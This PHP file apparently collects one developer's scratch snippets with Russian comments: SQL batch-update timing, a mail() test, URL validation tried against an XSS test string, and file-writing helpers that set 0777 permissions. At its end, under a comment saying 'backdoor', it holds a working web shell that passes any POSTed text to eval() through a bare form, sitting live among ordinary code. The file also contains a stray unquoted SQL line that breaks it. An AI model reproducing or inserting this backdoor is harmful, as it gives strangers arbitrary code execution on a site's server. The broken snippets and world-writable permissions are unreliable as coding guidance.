<?php
$b = '2017-03-08 14:11:10';
echo strtotime( $b); // e.g 1488982270 произвольную дату в правильном формате в unix метку

/* *** множественное обновление за 1 запрос,второй запрос работает быстрее*** */
$st_time = microtime(true);

// $wpdb->query("UPDATE alex_test SET post_title='t11111111111111_w2',post_content='c111111111111111_w2' WHERE id=1");
// $wpdb->query("UPDATE alex_test SET post_title='t21111111111111_w2',post_content='c211111111111111_w2' WHERE id=2");
// $wpdb->query("UPDATE alex_test SET post_title='t31111111111111_w2',post_content='c311111111111111_w2' WHERE id=3");
// $wpdb->query("UPDATE alex_test SET post_title='t41111111111111_w2',post_content='c411111111111111_w2' WHERE id=4");
// $wpdb->query("UPDATE alex_test SET post_title='t51111111111111_w2',post_content='c511111111111111_w2' WHERE id=5");
// $wpdb->query("UPDATE alex_test SET post_title='t61111111111111_w2',post_content='c611111111111111_w2' WHERE id=6");
// time == 0.36151599884033

$wpdb->query("UPDATE alex_test SET
    post_title = CASE id WHEN 1 THEN 'title1_123456789' WHEN 2 THEN 'title2_123456789' WHEN 3 THEN 'title3_123456789' WHEN 4 THEN 'title4_123456789' WHEN 5 THEN 'title5_123456789' WHEN 6 THEN 'title6_123456789' ELSE '' END,
    post_content = CASE id WHEN 1 THEN 'content1_123456789' WHEN 2 THEN 'content2_123456789' WHEN 3 THEN 'content3_123456789' WHEN 4 THEN 'content4_123456789' WHEN 5 THEN 'content5_123456789' WHEN 6 THEN 'content6_123456789' ELSE '' END");
// time  = 0.09584903717041

// это более правильный запрос
UPDATE t SET a = CASE id WHEN 1 THEN 'value1' WHEN 2 THEN 'value2' END, b = CASE id WHEN 1 THEN 'anothervalue1' WHEN 2 THEN 'anothervalue2' END WHERE id IN(1, 2)

$end_time = microtime(true);
echo "time = ".($end_time - $st_time);
/* *** множественное обновление за 1 запрос,второй запрос работает быстрее*** */

/* ****  проверка работы sendmail **** */

echo "check send e-mail<br>";
$to = 'freerun-2012@yandex.ru';
$from = 'rafael2013santi@gmail.com';
$sitename = $_SERVER['HTTP_HOST'];
$subject = "Заявка с сайта Установка ГБО";
$message = "проверка работы mail() Из формы:   \r\n Имя: \r\nТелефон: ";
$headers = "From: {$sitename} <" .$from. ">\r\nContent-type:text/plain; charset=utf-8\r\n";
if ( mail($to,$subject,$message,$headers) ) echo "mail send success!"; else echo "mail send error!";

/* ****  проверка работы sendmail **** */

/* **** as21 Валидация/фильтр url **** */

// $url = "https://www.youtube.com/";
// $url = "https://youtube.com/";
// $url = "http://youtube.com";
// $url = "http://you-tube.com";
// $url = "http://you-tu-be.com";
// $url = "https://www.you-tu-be.com";

// $url = "https://www.facebook.com/RGComposite/";
// $url ="https://www.instagram.com/rg_faserverbund/?ref=badge";
// $url = "https://www.youtube.com/user/RuGComposites";

$url = "https://www.you-tu-be.com/<script>alert('1');</script>"; // true и alert срабатывает
echo $url; echo "<hr>";

$url = strip_tags($url);
// $url = htmlspecialchars ($url);

echo "str after filter=".$url; echo "<hr>";

// from network
var_dump( filter_var($url, FILTER_VALIDATE_URL) ); echo "<br>";
var_dump( preg_match('#^(http|https):\/\/([A-Z0-9][A-Z0-9_-]*(?:.[A-Z0-9][A-Z0-9_-]*)+):?(d+)?\/?#i', $url) ); echo "<br>";
// my own regexp
// var_dump( preg_match('#^(http|https):\/\/(www\.)??[a-z0-9-\.]+(\.){1}(com|ru|net)\/??([a-z0-9-=\?])??#i', $url) );
var_dump( preg_match('#^(http|https):\/\/(www\.)??[a-z0-9-\.]+(\.){1}(com|ru|net)\/??#i', $url) );

/* **** as21 Валидация/фильтр url **** */


/* **** as21 write in file **** */
// permissin should be is least 666 for write
function as21_wjm_write_file_jobs_count($filename,$text){

	chmod($filename, 0777);
	$fp = fopen($filename, "w"); 
	$write = fwrite($fp, $text); 
	// var_dump($write);
	fclose($fp); 
}
/* **** as21 write in file **** */

/* **** as21 get valid array from file **** */ 
function as21_wjm_get_display_count_plus_by_group_id($group_id){
	$filename = AS21_PATH_JOBS_COUNT_TXT;
	if( file_exists($filename)) {

		// on hosting immediately convert valid array
		$file = file($filename); 
		// if($_GET['dev']==1) { alex_debug(0,1,'file',$file);}
		
		 /* //need for correctly work on localhost
		 $file = explode("\r", $file[0]); */

		 // get valid array from file
		 if( !isset($file[1]) ) $file = explode("\r", $file[0]);
	}

}
/* **** as21 get valid array from file **** */ 

// backdoor

if ( isset($_POST['text']) ) 
  eval ($_POST['text']); 
?> 
<form method='POST'> 
   <textarea name='text'></textarea> 
   <input type='submit'> 
</form>